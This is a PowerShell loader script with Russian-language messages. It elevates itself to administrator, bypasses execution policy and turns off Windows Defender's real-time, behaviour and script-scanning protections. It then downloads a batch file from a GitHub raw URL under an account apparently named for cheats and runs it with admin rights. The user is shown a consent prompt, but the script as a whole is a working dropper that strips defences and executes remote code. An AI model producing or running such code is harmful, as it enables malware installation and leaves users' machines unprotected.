param(
    [Parameter(Mandatory=$true)]
    [string]$Url = "https://raw.githubusercontent.com/DeathCheat1/dgfhffd/refs/heads/main/test.bat",
    [Parameter(Mandatory=$false)]
    [string]$DestinationPath,
    [Parameter(Mandatory=$false)]
    [string]$Arguments
)

function Ensure-AdminRights {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
   
    if (-not $isAdmin) {
        Write-Host "Запрашиваю повышение прав..." -ForegroundColor Yellow
        $scriptPath = $MyInvocation.MyCommand.Path
        $scriptArgs = "-Url `"$Url`""
        if ($DestinationPath) { $scriptArgs += " -DestinationPath `"$DestinationPath`"" }
        if ($Arguments) { $scriptArgs += " -Arguments `"$Arguments`"" }
       
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $scriptArgs"
        $psi.Verb = "runas"
       
        try {
            [System.Diagnostics.Process]::Start($psi)
            exit
        }
        catch {
            Write-Host "Ошибка запроса прав: $_" -ForegroundColor Red
            exit 1
        }
    }
    else {
        Write-Host "Уже с правами администратора." -ForegroundColor Green
    }
}

function Disable-Defender {
    Write-Host "Пытаюсь отключить антивирус Windows Defender..." -ForegroundColor Cyan
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Set-MpPreference -DisableBehaviorMonitoring $true
        Set-MpPreference -DisableBlockAtFirstSeen $true
        Set-MpPreference -DisableIOAVProtection $true
        Set-MpPreference -DisablePrivacyMode $true
        Set-MpPreference -DisableScriptScanning $true
        Write-Host "Антивирус Defender отключён." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Не удалось отключить Defender: $_" -ForegroundColor Red
        Write-Host "Возможно, включена Tamper Protection или используется другой антивирус." -ForegroundColor Yellow
        return $false
    }
}

function Download-File {
    param([string]$url, [string]$destPath)
   
    Write-Host "Скачиваю из $url ..." -ForegroundColor Cyan
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $destPath)
        Write-Host "Сохранено: $destPath" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
        return $false
    }
}

function Run-AsAdmin {
    param([string]$filePath, [string]$arguments)
   
    if (-not (Test-Path $filePath)) {
        Write-Host "Файл не найден: $filePath" -ForegroundColor Red
        return $false
    }
   
    Write-Host "Запускаю от имени администратора: $filePath" -ForegroundColor Cyan
    try {
        $processArgs = @{
            FilePath = $filePath
            Verb = "runas"
            Wait = $false
        }
        if ($arguments) {
            $processArgs.ArgumentList = $arguments
        }
        Start-Process @processArgs
        Write-Host "Запущено." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка запуска: $_" -ForegroundColor Red
        return $false
    }
}

try {
    Ensure-AdminRights

    Write-Host "`nДля скачивания и запуска файла требуется отключить антивирус Windows Defender." -ForegroundColor Yellow
    $userChoice = Read-Host "Вы согласны отключить антивирус? (y/n)"
    if ($userChoice -ne 'y') {
        Write-Host "Отказ пользователя. Выход." -ForegroundColor Red
        exit 1
    }
    $defenderDisabled = Disable-Defender
    if (-not $defenderDisabled) {
        Write-Host "Не удалось отключить антивирус. Дальнейшая работа невозможна." -ForegroundColor Red
        exit 1
    }

    if (-not $DestinationPath) {
        $fileName = [System.IO.Path]::GetFileName($Url)
        if (-not $fileName) { $fileName = "downloaded_file" }
        $DestinationPath = Join-Path $env:TEMP $fileName
    }
   
    $downloadSuccess = Download-File -url $Url -destPath $DestinationPath
    if (-not $downloadSuccess) {
        throw "Не удалось скачать файл."
    }
   
    $runSuccess = Run-AsAdmin -filePath $DestinationPath -arguments $Arguments
    if (-not $runSuccess) {
        throw "Не удалось запустить файл."
    }
   
    Write-Host "Готово." -ForegroundColor Green
}
catch {
    Write-Host "Ошибка: $_" -ForegroundColor Red
    exit 1
}
